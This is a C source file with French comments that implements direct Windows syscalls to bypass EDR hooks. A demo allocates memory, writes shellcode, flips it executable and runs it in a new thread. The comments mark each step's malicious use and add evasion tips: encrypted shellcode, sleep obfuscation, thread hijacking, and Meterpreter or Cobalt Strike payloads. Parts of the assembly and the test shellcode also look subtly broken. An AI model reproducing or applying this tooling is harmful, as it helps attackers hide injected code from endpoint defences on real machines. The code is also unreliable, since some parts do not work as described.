/*
 * ============================================================================
 * SYSCALLS DIRECTS - ÉVASION EDR
 * ============================================================================
 * 
 * Cette implémentation montre comment invoquer directement les syscalls
 * Windows sans passer par les fonctions de ntdll.dll qui peuvent être
 * hookées par les EDR.
 * 
 * PRINCIPE :
 * Au lieu d'appeler NtAllocateVirtualMemory depuis ntdll.dll (potentiellement
 * hookée), on exécute directement l'instruction "syscall" avec le bon numéro
 * de syscall (SSN - System Service Number).
 * 
 * LIMITATIONS :
 * - Les numéros de syscall varient selon les versions de Windows
 * - Cette implémentation est pour Windows 10/11 x64
 * - Les instructions syscall dans notre code sont détectables
 * 
 * COMPILATION :
 * gcc -o syscalls_direct.exe syscalls_direct.c -lntdll
 * 
 * ============================================================================
 */

#include <windows.h>
#include <stdio.h>
#include "syscalls.h"

// ============================================================================
// NUMÉROS DE SYSCALL (Windows 10/11 x64)
// ============================================================================
// Ces numéros sont extraits de ntdll.dll et peuvent varier selon la version
// Pour obtenir les bons numéros, on peut :
// 1. Désassembler ntdll.dll avec un outil comme IDA Pro ou Ghidra
// 2. Utiliser des outils comme SysWhispers2
// 3. Les extraire dynamiquement au runtime

#define SYSCALL_NtAllocateVirtualMemory    0x18
#define SYSCALL_NtWriteVirtualMemory       0x3A
#define SYSCALL_NtProtectVirtualMemory     0x50
#define SYSCALL_NtCreateThreadEx           0xC1
#define SYSCALL_NtWaitForSingleObject      0x04
#define SYSCALL_NtClose                    0x0F

// ============================================================================
// FONCTION ASSEMBLEUR POUR EXÉCUTER UN SYSCALL
// ============================================================================
// Cette fonction prépare les registres et exécute l'instruction syscall
// 
// CONVENTION D'APPEL Windows x64 :
// - RCX = 1er paramètre
// - RDX = 2ème paramètre
// - R8  = 3ème paramètre
// - R9  = 4ème paramètre
// - Stack = paramètres suivants
// 
// CONVENTION SYSCALL :
// - RAX = Numéro du syscall (SSN)
// - R10 = 1er paramètre (au lieu de RCX)
// - RDX, R8, R9, Stack = autres paramètres
// - Instruction "syscall" pour passer en mode kernel
//
extern NTSTATUS DoSyscall(DWORD syscallNumber, ...);

// Implémentation en inline assembly pour x64
__asm__(
    ".global DoSyscall\n"
    "DoSyscall:\n"
    "    mov r10, rcx\n"           // R10 = RCX (1er paramètre)
    "    mov eax, edx\n"           // EAX = EDX (numéro de syscall)
    "    mov rcx, r8\n"            // RCX = R8 (pour shifter les params)
    "    mov rdx, r9\n"            // RDX = R9
    "    mov r8, [rsp+0x28]\n"     // R8 = 5ème paramètre sur la stack
    "    mov r9, [rsp+0x30]\n"     // R9 = 6ème paramètre sur la stack
    "    sub rsp, 0x28\n"          // Alloue de l'espace sur la stack (shadow space)
    "    syscall\n"                 // ⚠️ INSTRUCTION SYSCALL - Transition vers le kernel
    "    add rsp, 0x28\n"          // Restaure la stack
    "    ret\n"                     // Retourne avec le résultat dans RAX
);

// ============================================================================
// IMPLÉMENTATION DES SYSCALLS DIRECTS
// ============================================================================

/*
 * NtAllocateVirtualMemory_Direct
 * ------------------------------
 * Alloue de la mémoire dans un processus sans passer par ntdll.dll
 * 
 * USAGE MALVEILLANT :
 * - Allouer de la mémoire pour du shellcode
 * - Contourner les hooks EDR sur VirtualAllocEx
 * 
 * DÉTECTION EDR :
 * - Allocation de mémoire RWX (PAGE_EXECUTE_READWRITE) = suspect
 * - Pattern d'allocation puis écriture puis exécution = injection
 * - Solution : Utiliser RW puis changer en RX après écriture
 */
NTSTATUS NtAllocateVirtualMemory_Direct(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
) {
    // Note : On utilise une fonction wrapper qui va préparer tous les
    // paramètres et appeler notre fonction DoSyscall
    
    // Pour simplifier, on utilise directement l'assembleur inline
    NTSTATUS status;
    
    __asm__ volatile (
        "mov r10, %1\n"                          // R10 = ProcessHandle
        "mov eax, %7\n"                          // EAX = Numéro de syscall
        "mov rcx, %1\n"                          // RCX = ProcessHandle
        "mov rdx, %2\n"                          // RDX = BaseAddress
        "mov r8, %3\n"                           // R8 = ZeroBits
        "mov r9, %4\n"                           // R9 = RegionSize
        // AllocationType et Protect sont sur la stack
        "push %6\n"                              // Push Protect
        "push %5\n"                              // Push AllocationType
        "sub rsp, 0x20\n"                        // Shadow space
        "syscall\n"                               // ⚠️ APPEL DIRECT AU KERNEL
        "add rsp, 0x30\n"                        // Nettoie la stack
        "mov %0, rax\n"                          // Stocke le résultat
        : "=r" (status)                           // Output
        : "r" (ProcessHandle), "r" (BaseAddress), "r" (ZeroBits),
          "r" (RegionSize), "r" (AllocationType), "r" (Protect),
          "i" (SYSCALL_NtAllocateVirtualMemory)  // Inputs
        : "rax", "rcx", "rdx", "r8", "r9", "r10", "r11", "memory"
    );
    
    return status;
}

/*
 * NtWriteVirtualMemory_Direct
 * ---------------------------
 * Écrit dans la mémoire d'un processus distant
 * 
 * USAGE MALVEILLANT :
 * - Écrire du shellcode dans le processus cible
 * - Modifier le comportement d'un processus légitime
 * 
 * DÉTECTION EDR :
 * - Écriture cross-process suspecte
 * - Signature du shellcode dans le buffer
 * - Solution : Chiffrer le shellcode avec XOR/AES
 */
NTSTATUS NtWriteVirtualMemory_Direct(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
) {
    NTSTATUS status;
    
    __asm__ volatile (
        "mov r10, %1\n"                          // R10 = ProcessHandle
        "mov eax, %6\n"                          // EAX = Numéro de syscall
        "mov rcx, %1\n"                          // RCX = ProcessHandle
        "mov rdx, %2\n"                          // RDX = BaseAddress
        "mov r8, %3\n"                           // R8 = Buffer
        "mov r9, %4\n"                           // R9 = NumberOfBytesToWrite
        "push %5\n"                              // Push NumberOfBytesWritten
        "sub rsp, 0x20\n"                        // Shadow space
        "syscall\n"                               // ⚠️ BYPASS DES HOOKS EDR
        "add rsp, 0x28\n"
        "mov %0, rax\n"
        : "=r" (status)
        : "r" (ProcessHandle), "r" (BaseAddress), "r" (Buffer),
          "r" (NumberOfBytesToWrite), "r" (NumberOfBytesWritten),
          "i" (SYSCALL_NtWriteVirtualMemory)
        : "rax", "rcx", "rdx", "r8", "r9", "r10", "r11", "memory"
    );
    
    return status;
}

/*
 * NtProtectVirtualMemory_Direct
 * -----------------------------
 * Change les protections mémoire d'une région
 * 
 * USAGE MALVEILLANT :
 * - Changer RW en RX après avoir écrit du shellcode
 * - Éviter l'allocation directe en RWX qui est très suspecte
 * 
 * DÉTECTION EDR :
 * - Changement vers PAGE_EXECUTE_* est surveillé
 * - Pattern : Allouer RW → Écrire → Changer en RX → Exécuter
 * - Solution : Sleep obfuscation, délais entre les opérations
 */
NTSTATUS NtProtectVirtualMemory_Direct(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
) {
    NTSTATUS status;
    
    __asm__ volatile (
        "mov r10, %1\n"
        "mov eax, %6\n"
        "mov rcx, %1\n"
        "mov rdx, %2\n"
        "mov r8, %3\n"
        "mov r9, %4\n"
        "push %5\n"
        "sub rsp, 0x20\n"
        "syscall\n"
        "add rsp, 0x28\n"
        "mov %0, rax\n"
        : "=r" (status)
        : "r" (ProcessHandle), "r" (BaseAddress), "r" (RegionSize),
          "r" (NewProtect), "r" (OldProtect),
          "i" (SYSCALL_NtProtectVirtualMemory)
        : "rax", "rcx", "rdx", "r8", "r9", "r10", "r11", "memory"
    );
    
    return status;
}

/*
 * NtCreateThreadEx_Direct
 * -----------------------
 * Crée un thread dans un processus
 * 
 * USAGE MALVEILLANT :
 * - Exécuter du shellcode injecté
 * - Créer un thread dans un processus distant (process injection)
 * 
 * DÉTECTION EDR :
 * - Création de thread cross-process très surveillée
 * - Start address dans une région privée = très suspect
 * - Solution : Thread hijacking, Early Bird APC
 */
NTSTATUS NtCreateThreadEx_Direct(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
) {
    NTSTATUS status;
    
    // Cette fonction a 11 paramètres, donc beaucoup iront sur la stack
    __asm__ volatile (
        "mov r10, %1\n"
        "mov eax, %12\n"
        "mov rcx, %1\n"                          // ThreadHandle
        "mov rdx, %2\n"                          // DesiredAccess
        "mov r8, %3\n"                           // ObjectAttributes
        "mov r9, %4\n"                           // ProcessHandle
        // Les autres paramètres vont sur la stack dans l'ordre inverse
        "push %11\n"                             // AttributeList
        "push %10\n"                             // MaximumStackSize
        "push %9\n"                              // StackSize
        "push %8\n"                              // ZeroBits
        "push %7\n"                              // CreateFlags
        "push %6\n"                              // Argument
        "push %5\n"                              // StartRoutine
        "sub rsp, 0x20\n"                        // Shadow space
        "syscall\n"                               // ⚠️ CRÉATION DE THREAD FURTIVE
        "add rsp, 0x58\n"                        // Nettoie stack (7*8 + 0x20)
        "mov %0, rax\n"
        : "=r" (status)
        : "r" (ThreadHandle), "r" (DesiredAccess), "r" (ObjectAttributes),
          "r" (ProcessHandle), "r" (StartRoutine), "r" (Argument),
          "r" (CreateFlags), "r" (ZeroBits), "r" (StackSize),
          "r" (MaximumStackSize), "r" (AttributeList),
          "i" (SYSCALL_NtCreateThreadEx)
        : "rax", "rcx", "rdx", "r8", "r9", "r10", "r11", "memory"
    );
    
    return status;
}

/*
 * NtWaitForSingleObject_Direct
 * ----------------------------
 * Attend qu'un objet soit signalé (ex: qu'un thread se termine)
 */
NTSTATUS NtWaitForSingleObject_Direct(
    HANDLE Handle,
    BOOLEAN Alertable,
    PLARGE_INTEGER Timeout
) {
    NTSTATUS status;
    
    __asm__ volatile (
        "mov r10, %1\n"
        "mov eax, %4\n"
        "mov rcx, %1\n"
        "mov rdx, %2\n"
        "mov r8, %3\n"
        "sub rsp, 0x20\n"
        "syscall\n"
        "add rsp, 0x20\n"
        "mov %0, rax\n"
        : "=r" (status)
        : "r" (Handle), "r" ((ULONG)Alertable), "r" (Timeout),
          "i" (SYSCALL_NtWaitForSingleObject)
        : "rax", "rcx", "rdx", "r8", "r9", "r10", "r11", "memory"
    );
    
    return status;
}

/*
 * NtClose_Direct
 * --------------
 * Ferme un handle
 */
NTSTATUS NtClose_Direct(
    HANDLE Handle
) {
    NTSTATUS status;
    
    __asm__ volatile (
        "mov r10, %1\n"
        "mov eax, %2\n"
        "mov rcx, %1\n"
        "sub rsp, 0x20\n"
        "syscall\n"
        "add rsp, 0x20\n"
        "mov %0, rax\n"
        : "=r" (status)
        : "r" (Handle), "i" (SYSCALL_NtClose)
        : "rax", "rcx", "rdx", "r8", "r9", "r10", "r11", "memory"
    );
    
    return status;
}

// ============================================================================
// FONCTIONS UTILITAIRES
// ============================================================================

/*
 * PrintError
 * ----------
 * Affiche un message d'erreur avec le code NTSTATUS
 */
VOID PrintError(const char* function, NTSTATUS status) {
    printf("[-] %s failed with status: 0x%08X\n", function, status);
}

/*
 * PrintSuccess
 * ------------
 * Affiche un message de succès
 */
VOID PrintSuccess(const char* message) {
    printf("[+] %s\n", message);
}

// ============================================================================
// EXEMPLE D'UTILISATION
// ============================================================================

#ifdef COMPILE_DEMO_DIRECT

int main() {
    printf("=======================================================\n");
    printf("  SYSCALLS DIRECTS - Démonstration\n");
    printf("=======================================================\n\n");
    
    // Shellcode de test : MessageBoxA("Hello", "Direct Syscall", MB_OK)
    // Ce shellcode est un exemple simple, dans un cas réel on utiliserait
    // un shellcode Meterpreter, Cobalt Strike, ou personnalisé
    unsigned char shellcode[] = 
        "\x48\x83\xec\x28"                          // sub rsp, 0x28
        "\x48\x31\xc9"                              // xor rcx, rcx
        "\x48\x8d\x15\x1a\x00\x00\x00"              // lea rdx, [message]
        "\x4c\x8d\x05\x13\x00\x00\x00"              // lea r8, [title]
        "\x48\x31\xc9"                              // xor r9, r9
        "\xff\x15\x02\x00\x00\x00"                  // call [MessageBoxA]
        "\xeb\x08"                                   // jmp end
        "\x00\x00\x00\x00\x00\x00\x00\x00"          // MessageBoxA address
        "\x48\x31\xc0"                              // xor rax, rax
        "\x48\x83\xc4\x28"                          // add rsp, 0x28
        "\xc3"                                       // ret
        "Direct Syscall\0"                           // title
        "Hello from direct syscall!\0";              // message
    
    SIZE_T shellcodeSize = sizeof(shellcode);
    
    printf("[*] Shellcode size: %zu bytes\n\n", shellcodeSize);
    
    // ÉTAPE 1 : Allouer de la mémoire (RW)
    printf("[*] Step 1: Allocating memory (PAGE_READWRITE)...\n");
    PVOID baseAddress = NULL;
    SIZE_T regionSize = shellcodeSize;
    NTSTATUS status = NtAllocateVirtualMemory_Direct(
        GetCurrentProcess(),                         // Dans notre processus
        &baseAddress,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE                               // ⚠️ RW seulement (pas RWX)
    );
    
    if (!NT_SUCCESS(status)) {
        PrintError("NtAllocateVirtualMemory_Direct", status);
        return 1;
    }
    PrintSuccess("Memory allocated successfully");
    printf("    Address: 0x%p\n", baseAddress);
    printf("    Size: %zu bytes\n\n", regionSize);
    
    // ÉTAPE 2 : Écrire le shellcode
    printf("[*] Step 2: Writing shellcode to memory...\n");
    SIZE_T bytesWritten = 0;
    status = NtWriteVirtualMemory_Direct(
        GetCurrentProcess(),
        baseAddress,
        shellcode,
        shellcodeSize,
        &bytesWritten
    );
    
    if (!NT_SUCCESS(status)) {
        PrintError("NtWriteVirtualMemory_Direct", status);
        return 1;
    }
    PrintSuccess("Shellcode written successfully");
    printf("    Bytes written: %zu\n\n", bytesWritten);
    
    // ÉTAPE 3 : Changer les protections en RX
    printf("[*] Step 3: Changing memory protection to PAGE_EXECUTE_READ...\n");
    ULONG oldProtect = 0;
    status = NtProtectVirtualMemory_Direct(
        GetCurrentProcess(),
        &baseAddress,
        &regionSize,
        PAGE_EXECUTE_READ,                           // ⚠️ Maintenant exécutable
        &oldProtect
    );
    
    if (!NT_SUCCESS(status)) {
        PrintError("NtProtectVirtualMemory_Direct", status);
        return 1;
    }
    PrintSuccess("Memory protection changed successfully");
    printf("    Old protection: 0x%08X\n", oldProtect);
    printf("    New protection: PAGE_EXECUTE_READ\n\n");
    
    // ÉTAPE 4 : Créer un thread pour exécuter le shellcode
    printf("[*] Step 4: Creating thread to execute shellcode...\n");
    HANDLE hThread = NULL;
    status = NtCreateThreadEx_Direct(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        GetCurrentProcess(),
        baseAddress,                                 // ⚠️ Point d'entrée = notre shellcode
        NULL,
        0,                                           // Pas de CREATE_SUSPENDED
        0,
        0,
        0,
        NULL
    );
    
    if (!NT_SUCCESS(status)) {
        PrintError("NtCreateThreadEx_Direct", status);
        return 1;
    }
    PrintSuccess("Thread created successfully");
    printf("    Thread handle: 0x%p\n\n", hThread);
    
    // ÉTAPE 5 : Attendre que le thread se termine
    printf("[*] Step 5: Waiting for thread to complete...\n");
    status = NtWaitForSingleObject_Direct(hThread, FALSE, NULL);
    
    if (!NT_SUCCESS(status)) {
        PrintError("NtWaitForSingleObject_Direct", status);
        return 1;
    }
    PrintSuccess("Thread completed successfully");
    
    // ÉTAPE 6 : Nettoyer
    printf("[*] Step 6: Cleaning up...\n");
    NtClose_Direct(hThread);
    PrintSuccess("Handle closed");
    
    printf("\n=======================================================\n");
    printf("  Démonstration terminée avec succès !\n");
    printf("=======================================================\n");
    
    return 0;
}

#endif // COMPILE_DEMO_DIRECT
